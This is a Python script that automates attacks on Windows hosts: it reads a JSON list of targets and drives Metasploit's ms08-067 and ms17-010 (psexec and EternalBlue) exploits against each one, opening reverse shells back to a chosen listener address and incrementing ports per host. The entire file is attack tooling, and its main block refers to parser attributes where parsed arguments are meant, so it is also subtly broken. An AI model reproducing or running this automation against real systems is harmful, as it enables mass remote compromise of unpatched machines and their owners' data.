import os
import json
import subprocess
import argparse

_exploit_dict_structure = ['ms08-067', 'ms17-010-psexec', 'ms17-010-eternalblue']

def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
    """
    @exploit_dict: A dictionary in the format that is retuned by vuln_checker signifying hosts to attack.
    @start_port: The initial port to start reverse shell handlers on; each host consumes one port, singly incremented.
    @lhost: The IP address to bind the reverse shell sockets to (ie. for NAT); if None, Metasploit will try to detect.

    Given a dict in the form as returned from check_vulnerable, execute
    msfconsole and use ms08-067 and ms17-010 to gain shells on the hosts.
    If there are no hosts defined, this method returns None, otherwise
    THIS METHOD DOES NOT RETURN.
    """

    port = start_port  # Necessary because this becomes multithreaded when Metasploit takes over
    commands = []  # List of commands to execute in metasploit

    assert len(exploit_dict) == len(_exploit_dict_structure)
    for k in _exploit_dict_structure:
        assert k in exploit_dict

    if len(exploit_dict['ms08-067']) > 0:
        commands.append('use exploit/windows/smb/ms08_067_netapi')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms08-067']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Better for Win XP & 2000
    if len(exploit_dict['ms17-010-psexec']) > 0:
        commands.append('use exploit/windows/smb/ms17_010_psexec')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms17-010-psexec']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    # Better for Win Vista+
    if len(exploit_dict['ms17-010-eternalblue']) > 0:
        commands.append('use exploit/windows/smb/ms17_010_eternalblue')
        if lhost:
            commands.append('set lhost {0}'.format(lhost))

        for host in exploit_dict['ms17-010-eternalblue']:
            commands.append('set rhost {0}'.format(host))
            commands.append('set lport {0}'.format(port))
            port += 1
            commands.append('exploit -j')

    if len(commands) == 0:
        return None

    # Reinit the db so that its up and clean (might change this to be smarter)
    subprocess.run(['msfdb', 'reinit'])
    # Execv to replace this process, fortunately metasploit will handle the inside scripting
    os.execv('/usr/bin/msfconsole', ['msfconsole', '-x', '; '.join(commands)])

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit and open shells on hosts denoted in the input JSON file.')
    parser.add_argument('file', help='a JSON format file of exploit:hosts to run')
    parser.add_argument('--port', '-p', help='port to start reverse shells from, each host requires one port, incremented singly', default=4444)
    parser.add_argument('--lhost', '-lh', help='host to try to bind the listening sockets to, if unsupplied metasploit will try to guess', default=None)
    args = parser.parse_args()

    exploit_dict = None
    with open(parser.file, 'r') as f:
        exploit_dict = json.load(f)

    handle_exploitation(exploit_dict, parser.port, parser.lhost)